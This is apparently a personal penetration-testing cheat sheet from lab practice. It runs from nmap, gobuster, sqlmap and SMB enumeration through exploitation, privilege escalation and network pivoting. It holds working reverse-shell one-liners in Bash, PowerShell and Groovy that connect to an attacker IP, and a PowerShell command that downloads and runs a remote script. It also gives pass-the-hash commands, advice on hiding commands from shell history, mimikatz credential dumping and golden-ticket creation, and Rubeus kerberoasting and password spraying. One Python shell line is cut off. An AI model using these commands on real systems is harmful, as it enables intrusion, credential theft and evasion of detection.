<h2 align="center">INDEX</h2>
<h4>1 Enumeration</h4>

	1 Nmap
	2 Gobuster, wpscan, nikto
	3 Enum4linux
	4 SMB Enumeration
	5 Windows specific
	6 Favourite tools

<h4>2[Get that shell](#GTS) </h4>

	1 Reverse shell
	2 Stabilize shell
	3 Get a Windows shell
	4 Windows remote connection


<h4>3 Once inside</h4>

	1 Do not leave traces
	2 Stabilize Shell
	3 First moves
	4 Privileges Escalation Linux
	5 Privileges Escalation Windows
	  5.1 Kerberos

<h4>4 Get files from your local machine to the target</h4>

	1 Python server
	2 Python SMB
	3 Curl
	4 Scp

<h4>5 Get files from target to your local machine</h4>

	1 Scp
	2 Curl

<h4>6 Network Pivoting</h4>

  	1 Enumerating a network using native and  statically   compiled tools
  	2 Proxychains / FoxyProxy
  	3 SSH port forwarding and tunnelling (primarily   Unix)
  	4 plink.exe (Windows)
  	5 socat (Windows and Unix)
  	6 chisel (Windows and Unix)
  	7 sshuttle (currently Unix only)


--------------------------------------------------------------------------------


<h3 align="center">Enumeration:</h3>

See which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using
Bash:

	for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done

Always good to have a nmap static file.

My <strong>nmap</strong> commands:

	nmap -vv -p- IP -oN name.txt

Version scan:

	sudo nmap -vv -sV -O -p ..,.. IP -oN name.txt

No ping scan:

	sudo nmap -A -Pn -sV -sC -vv -p- -oN name.txt IP

Vulnerability scan:

	nmap -Pn --script vuln -oN name.txt IP

Flags:

	-sS TCP SYN scan, -sT Connect scan, -sA ACK scan
	-sW Window scan, -sM Maimon scan,-sU UDP Scan
	-sN TCP Null scan, -sF FIN scan,-sX Xmas scan
	-O Enable OS Detection, -sC as to --script=default
	--scanflags    Customize TCP scan flags
	-sI zombie host[:probeport]  Idle scan
	-sY SCTP INIT scan, -sZ COOKIE-ECHO scan
	-sO IP protocol scan
	-b "FTP relay host"  FTP bounce scan

Examples of nmap pipe:
Scans for http/https servers on port 80 & 443 and pipes into Nikto.

	nmap -p80,443 10.0.1.0/24 -oG - | nikto.pl -h -

<h4>Crackmapexec:</h4>

	Enumerate: cme <IP>/<subnet>
	Enumerate SMB: smb <target(s)> -u '' -p ''
	Enumerate with user and p for psswd H for hash:
	cme <IP>/<subnet> -u 'USER' -H 'HASH' --local-auth

<h3>Gobuster</h3>

Usage: gobuster dir [flags]

	Flags:
		-f, --add-slash                     Append / to each request
		-c, --cookies string                Cookies to use for the requests
		-e, --expanded                      Expanded mode, print full URLs
		-x, --extensions string             File extension(s) to search for
		-r, --follow-redirect               Follow redirects
		-H, --headers stringArray           Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'
		-h, --help                          help for dir
		-l, --include-length                Include the length of the body in the output
		-k, --no-tls-validation             Skip TLS certificate verification
		-n, --no-status                     Don't print status codes
		-P, --password string               Password for Basic Auth
		-p, --proxy string                  Proxy to use for requests [http(s)://host:port]
		-s, --status-codes string           Positive status codes (will be overwritten with status-codes-blacklist if set) (default "200,204,301,302,307,401,403")
		-b, --status-codes-blacklist string Negative status codes (will override status-codes if set)
  		--timeout duration              HTTP Timeout (default 10s)
		-u, --url string                    The target URL
		-a, --useragent string              Set the User-Agent string (default "gobuster/3.1.0")
		-U, --username string               Username for Basic Auth
		-d, --discover-backup               Upon finding a file search for backup files
  		--wildcard                      Force continued operation when wildcard found

	Global Flags:
		-z, --no-progress       Don't display progress
		-o, --output string     Output file to write results to (defaults to stdout)
		-q, --quiet             Don't print the banner and other noise
		-t, --threads int       Number of concurrent threads (default 10)
  		--delay duration    Time each thread waits between requests (e.g. 1500ms)
		-v, --verbose           Verbose output (errors)
  	-w, --wordlist string   Path to the wordlist

My most used :

	gobuster dir http://example.com -w /usr/share/seclist/Discovery/Web-Content/directory-list-2-3-medium.txt -x txt,php,html

<h3>Subdomain Enumeration</h3>

- OSINT way:

	use sites like https://crt.sh and https://transparencyreport.google.com/https/certificates
	Do a search on google with this syntax : -site:www.example.com  site:*.example.com

- DNS brute force:

	in terminal: dnsrecon -t brt -d exsample.com

- Sublist3r:

	in terminal: ./sublist3r.py -d example.com

- Gobuster:

	gobuster vhost [flags]

	Flags:
  	-c, --cookies string        Cookies to use for the requests
  	-r, --follow-redirect       Follow redirects
  	-H, --headers stringArray   Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'
  	-h, --help                  help for vhost
  	-k, --no-tls-validation     Skip TLS certificate verification
  	-P, --password string       Password for Basic Auth
  	-p, --proxy string          Proxy to use for requests [http(s)://host:port]
      --timeout duration      HTTP Timeout (default 10s)
  	-u, --url string            The target URL
  	-a, --useragent string      Set the User-Agent string (default "gobuster/3.1.0")
  	-U, --username string       Username for Basic Auth

	Global Flags:
  	-z, --no-progress       Don't display progress
  	-o, --output string     Output file to write results to (defaults to stdout)
  	-q, --quiet             Don't print the banner and other noise
  	-t, --threads int       Number of concurrent threads (default 10)
    --delay duration    Time each thread waits between requests (e.g. 1500ms)
  	-v, --verbose           Verbose output (errors)
  	-w, --wordlist string   Path to the wordlist



<h3 align="center">My sqlmap cheat sheet:</h3>

Enumerate databases

	sqlmap --dbms=mysql -u "$URL" --dbs

Enumerate tables

	sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables

Dump table data

	sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump

Specify parameter to exploit

	sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2

Specify parameter to exploit in ‘nice’ URIs

	sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs # exploits param1

Get OS shell

	sqlmap --dbms=mysql -u "$URL" --os-shell

Get SQL shell

	sqlmap --dbms=mysql -u "$URL" --sql-shell

SQL query

	sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"

Use Tor Socks5 proxy

	sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs

WPSCAN:

	wpscan --url http://<domain> --enumerate ap
	wpscan --url http://<domain> --enumerate u
	wpscan --url http://<domain> --wordlist <wordlist> --username <user>
	wpscan --url http://address -P /txt -U wp_users.txt

<h3 align="center">SMB Enumeration</h3>


enum4linux $IP

smbmap -H $IP

smbmap -H

smbclient -L $IP

smbclient -H $IP

smbclient -L $IP -U $USERNAME

nmap --script smb-enum-shares -p139,445 $IP

crackmapexec smb $IP -u ' ' -p ' ' --shares



<h3 align="center">Windows Specific</h3>

Powerview script (from Empire) Enumeration ( https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993 )

	Enable execution script policy:
		powershell -ep bypass

	Start PowerView
		. .\path_to\PowerView.ps1

	Enumerate the domain users:
		Get-NetUser | select cn

	Enumerate the domain groups:
  		Get-NetGroup -GroupName *admin*

	find Share:
  		Invoke-ShareFinder

Bloohound:

	Start BloodHound:
		. .\Downloads\SharpHound.ps1

	Collect informations:
  		Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip

	retrieve file:
  		scp Administrator@10.10.200.95:C:/Users/Administrator/20210503075833_loot.zip loot.zip



	Find OS running on the network:
		Get-NetComputer -fulldata | select operatingsystem




Kerberos Enumeration

	kerbrute is the perfect tool

	enumerate for users:
		./kerbrute userenum --dc Controller.local -d Controller.local UserList.txt


##<h3 align="center"><div id="GTS"> 2 Get that shell</div></h3>

<b>Bash TCP</b>

		bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

		0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196

		/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1

<b>Bash UDP</b>

		Victim:
		sh -i >& /dev/udp/10.0.0.1/4242 0>&1

		Listener:
		nc -u -lvp 4242

<b>Python</b>

		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234)

<b>Powershell</b>

		powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


		powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


		powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')


<b>Groovy Jenkins Shell</b>

		String host="IPHERE";
		int port=PORTNUMBERHERE;
		String cmd="cmd.exe";
		Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();


<h4>2.4 Windows remote connection with hash password and share drive load</h4>

	evil-winrm -i <DC-IP> -u <user> -H <hash> pth-winexe -U <domain>/<user>%<hash> //<IP> cmd psexec.py user:@<IP> -hashes :<hash>for shellsxfreerdp /u:<user> /pth:<hash> /v:$IPfor RDPpth-smbclient -U <domain>/<user>%<hash> //<IP> cmd.exefor SMB



<h3 align="center">3 Once insede</h3>


3.1-Once in remember not to leave traces, your first moves should be to check the user you are, then check access to bash history.
	Remember to use a space in front of all commands, this will not log in history.

<h4>3.2-Stabilize your shell, linux common ways:</h4>

	python -c 'import pty; pty.spawn("/bin/sh")' # or /bin/bash

	echo os.system('/bin/bash')

	/bin/sh -i

	perl -e 'exec "/bin/sh";'

	awk 'BEGIN {system("/bin/bash")}'

	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;

<h4>3.3-First moves</h4>

 Avoid records by spacing before commands, check history for any traces, check if ssh keys are present, load linpeas and run it

<h4>3.4 - Linux Privileges Escalation</h4>

Some type of privileges escalations in linux:

- Privilege Escalation: Kernel Exploits
- Privilege Escalation: Sudo
- Privilege Escalation: SUID
- Privilege Escalation: Capabilities
- Privilege Escalation: Cron Jobs
- Privilege Escalation: PATH
- Privilege Escalation: NFS

3.4.1 Enumeration

Some key command to remember:
- hostname  
- uname ( -a , -r, etc..)  
- ps ( -A, axjf, aux,..)  
- env  
- sudo -l  
- id  
- history  
- ifconfig  
- ip route  
- netstat (-a, -at, -au, -s, -t, -u,  -l, etc..)  
- echo $path  #    What folders are located under $PATH, Does your current user have write privileges for any of these folders?
  Can you modify $PATH? Is there a script/application you can start that will be affected by this vulnerability?

Some places to check:  
- /proc/Version  
- /etc/issue  
- /etc/passwd  
- /etc/crontab

Find SUID bit set by using the command:

		find / -type f -perm -04000 -ls 2>/dev/null

Find list of enables capabilities:

		getcap -r / 2>/dev/null

Find writable directories:

		find / -writable 2>/dev/null
		find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

Some tools for automated enumeration:  
	- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS  
	- LinEnum: https://github.com/rebootuser/LinEnum  
	- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester  
	- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration  
	- Linux Priv Checker: https://github.com/linted/linuxprivchecker  

<h4>3.5-Windows Privileges escalation</h4>

  3.5.1-Kerberos

	Rubeus is a powerful tool for attacking Kerberos.  

		Harvesting Tickets w/ Rubeus  
			Rubeus.exe harvest /interval:30  
				This command tells Rubeus to harvest for TGTs every 30 seconds

			Rubeus.exe brute /password:Password1 /noticket
				This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

		Dump hases:
			rubeus.exe kerberoast
				This will dump the Kerberos hash of any kerberoastable users    

			Rubeus.exe asreproast
				This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.

<h4>MIMIKATZ:</h4>

		privilege::debug
			Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz

		token::elevate
			Elevate privileges to execute commands.

		lsadump::sam
			This will dump all hashes in memory.

		sekurlsa::tickets /export
			this will export all of the .kirbi tickets into the directory that you are currently in

		kerberos::ptt <ticket>
			run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket

		lsadump::lsa /inject /name:krbtgt
			This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need
			to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

		Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:
			This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot,
			the sid of the service account into sid, and change the id to 1103.

		misc::cmd 	
			this will open a new elevated command prompt with the given ticket in mimikatz.


<h3 align="center">4 Get files from your local machine to the target</h3>

Create a python server:

In your machine do:

	sudo python3 -m http.server 80

Then grab the files from the target with a proper command:

	wget http://IP/FILENAME && chmod +x file

	curl IP/Filename -o /tmp/Filename && chmod +x /tmp/Filename

Via scp if you have a login:

	scp file/to/upload user@ip:/path/to/file


Powershell:

	(New-Object System.Net.WebClient).Downloadfile('http://ADDRESS-TO-FILE/FILE', 'SAVEASNAME')

	Invoke-WebRequest http://http://ADDRESS-TO-FILE/FILE -OutFile "SAVEASFILE"

Netcat can allow for downloading files by connecting to a specific listening port that will pass the contents of a file over the connection.
Note that this example is Linux specific.

On the attackers computer, type:

	cat file | nc -l 1234

Windows Share (Net Use)

   To mount a remote drive, type:

	net use z: \\remotepc\sharename /u:domainname\username password

   We can also use * instead of Z:. This will automatically pick up the unused drive letter starting from Z:

	net use * \\remotepc\share /u:domainname\username password

If you have administrator access to the remote computer then you can map the system drive or any other drive of the remote computer with the below command.

	net use \\remotepc\C$ /u:username password

PowerShell:

  PowerShell (any version):

		(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")  

   PowerShell 4.0 & 5.0:

		Invoke-WebRequest "https://example.com/archive.zip" -OutFile "C:\Windows\Temp\archive.zip


<h3 align="center">5 Get files from target to your local machine</h3>

if you have a log in, from your machine:

		scp user@ip:/path/to/file output

<h3 align="center">  -6-  Network Pivoting</h3>

<h4 align="center">Proxychains</h4>
Conf files:
	./proxychains.conf
	~/.proxychains/proxychains.conf
	/etc/proxychains.conf
Specifically, we are interested in the "ProxyList" section
If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash.
Comment out the proxy_dns line using a hashtag (#) at the start of the line before performing a scan through the proxy!
	proxychains nc 172.16.0.10 23
You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packets (Ping requests) will also not work through the proxy,
so use the  -Pn  switch to prevent Nmap from trying it.


<h4 align="center">SSH Tunnelling / Port Forwarding</h4>
Forward Connections

   Port forwarding is accomplished with the -L switch, which creates a link to a Local port. For example, if we had SSH access
   to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:

	ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN

Reverse Connections

   First, generate a new set of SSH keys,then add the public to your own authorized file.
   The only thing left is to do the unthinkable, transfer the private key to the target box. This is usually an absolute no-no,
   which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over. Once copied:

	ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
   This would open up a port forward to our Kali box
	My used command:

		sshuttle -r root@10.200.86.200 --ssh-cmd 'ssh -i id_rsa' 10.200.86.0/24 -x 10.200.86.200


<h4 align="center">Plink.exe</h4>
Windows servers are unlikely to have an SSH server running so this would be done with the following command:

	cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N

Note that any keys generated by ssh-keygen will not work properly here. You will need to convert them using the puttygen tool,
which can be installed on Kali using sudo apt install putty-tools. After downloading the tool, conversion can be done with:

	puttygen KEYFILE -o OUTPUT_KEY.ppk

<h4 align="center">Socat.exe</h4>
Reverse Shell Relay

   Upload a static socat binary file if not present.

		./socat tcp-l:8000 tcp:ATTACKING_IP:443 &

   A classic listener will catch the connection:

		sudo nc -lvnp 443

<h4 align="center">Port Forwarding</h4>
Situation: the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10

	./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &

fork = every connection is a new process
reuseaddr = the port stays open after a connection is made to it.
We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.

<h4 align="center">Chisel.exe</h4>
You must have a chisel binary on attack and target.

_Reverse SOCKS Proxy:

   On our own attacking box we would use a command that looks something like this:

	./chisel server -p LISTEN_PORT --reverse &

   On the compromised host, we would use the following command:

	./chisel client ATTACKING_IP:LISTEN_PORT R:socks &

_Forward SOCKS Proxy:_

   First, on the compromised host we would use:

	./chisel server -p LISTEN_PORT --socks5

   On our own attacking box we would then use:

	./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks

_Remote Port Forward:

   For a remote port forward, on our attacking machine we use the exact same command as before:

	./chisel server -p LISTEN_PORT --reverse &

   Once again this sets up a chisel listener for the compromised host to connect back to.

   The command to connect back is slightly different this time, however:

	./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &

   This would allow us to access 172.16.0.10:22 (via SSH) by navigating to 127.0.0.1:2222.

_Local Port Forward:

   On the compromised target we set up a chisel server:

	./chisel server -p LISTEN_PORT
   We now connect to this from our attacking machine like so:

	./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT

   In the wreath network I used chisel this way:
     I started a chisel forward proxy on the compromised system:

	.\chiselFrenzis.exe server -p 24000 --socks5

   On my kali:

	./chisel_1.7.3_linux_amd64 client IP_from:24000 9050:socks

   This was done on machine .150 that is not the machine exposed (.200)
   Do not forget to edit the proxychains conf file to socks5.

<h4 align="center">Shuttle:</h4>

  The base command for connecting to a server with sshuttle is as follows:

	sshuttle -r username@address subnet

   For example, in our fictional 172.16.0.x network with a compromised server at 172.16.0.5, the command may look something like this:

	sshuttle -r user@172.16.0.5 172.16.0.0/24

   Shuttle does not have -i key flag, you can override that with this: --shh-cmd “-i id_rsa”, for example:

	sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24

   If the compromised machine you are using is in the subnet you want to shuttle into, you need to exclude its IP from the subnet with the -x switch.

	sshuttle -r user@Target_IP IP/subnet -x target_IP

   My wreath shuttle command on my kali:

	sshuttle -r root@10.200.86.200 --ssh-cmd 'ssh -i id_rsa' 10.200.86.0/24 -x 10.200.86.200
